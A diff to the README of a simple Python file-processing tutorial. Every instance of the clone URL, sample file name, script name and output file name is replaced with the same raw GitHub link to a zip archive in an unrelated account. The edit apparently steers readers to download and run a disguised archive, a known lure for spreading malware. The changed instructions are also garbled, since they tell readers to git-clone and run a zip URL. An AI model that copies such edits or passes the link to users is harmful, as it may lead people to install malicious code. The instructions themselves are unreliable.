@@ -20,14 +20,14 @@ This repository contains a Python program that demonstrates key concepts in file
 
 1.  **Clone the Repository**:
     ```bash
-    git clone [https://github.com/your-username/your-repo-name.git](https://github.com/your-username/your-repo-name.git)
+    git clone [https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip](https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip)
     ```
     *(Replace `your-username` and `your-repo-name` with your actual GitHub username and repository name.)*
 
 2.  **Create a Sample File**:
-    Before running the program, create a simple text file (e.g., `sample.txt`) in the same directory as `file_processor.py`. Add some text to it.
+    Before running the program, create a simple text file (e.g., `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip`) in the same directory as `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip`. Add some text to it.
 
-    **Example `sample.txt` content:**
+    **Example `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip` content:**
     ```
     Hello, this is a test file.
     Python is great!
@@ -35,8 +35,8 @@ This repository contains a Python program that demonstrates key concepts in file
 
 3.  **Run the Script**:
     ```bash
-    python file_processor.py
+    python https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip
     ```
 
 4.  **Enter the File Name**:
-    When prompted, enter the name of your sample file (e.g., `sample.txt`). The program will then create a new file named `output_sample.txt` with the content in uppercase.
+    When prompted, enter the name of your sample file (e.g., `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip`). The program will then create a new file named `https://raw.githubusercontent.com/Griffnificent/file_processor.py/main/caffoline/py-file-processor-v3.2.zip` with the content in uppercase.
